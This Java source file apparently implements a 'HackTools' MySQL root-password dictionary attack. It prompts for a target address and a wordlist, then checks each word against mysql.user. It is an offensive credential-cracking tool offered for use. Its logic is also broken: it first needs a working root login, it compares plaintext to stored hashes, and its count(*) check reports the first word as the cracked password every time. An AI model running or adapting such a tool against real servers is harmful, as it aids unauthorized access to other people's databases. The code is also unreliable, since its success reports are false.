
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Scanner;

 class t7 {
    public static void main(String[] args) throws IOException, InterruptedException {
		System.out.println("请输入地址+端口");
		Scanner pass1 = new Scanner(System.in);
		System.out.print("Root@HackTools：>");
		String ip = pass1.next();
		String url = "jdbc:mysql://"+ip;// 连接数据库的url
		String driverName = "com.mysql.jdbc.Driver";// 驱动名
		String userName = "root";// MySQL的用户名
		String passwd = "";// MySQL的密码
		System.out.println("请输入字典的路径");
		System.out.print("Root@HackTools：>");
		String path1 = pass1.next();
		if(path1=="1"){
			
		}
		Connection con;
		Statement st;
		BufferedReader bufferedReader = null;
		try {
			Class.forName(driverName);// 加载驱动
			con = DriverManager.getConnection(url, userName, passwd);// 获取连接
			st = con.createStatement();// 创建statement
			bufferedReader = new BufferedReader(new FileReader(new File(path1)));// 读取密码文件
			String pass;
			while ((pass = bufferedReader.readLine()) != null) {// 逐行读取密码
				String sql = "SELECT count(*) FROM mysql.user WHERE user='root' AND password='" + pass
					+ "'";
				ResultSet resultSet = st.executeQuery(sql);
				if (resultSet.next()) {// 如果查询返回记录，则说明密码正确
					System.out.println("密码爆破成功，为: " + pass);
					break;
				}else{
					System.out.println("未找到密码，换个字典试试吧");
				}
			}
			st.close();
			con.close();
		} catch (SQLException e) {
			System.out.println("MySQL操作错误");
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (bufferedReader != null)
					bufferedReader.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}}
	}
	
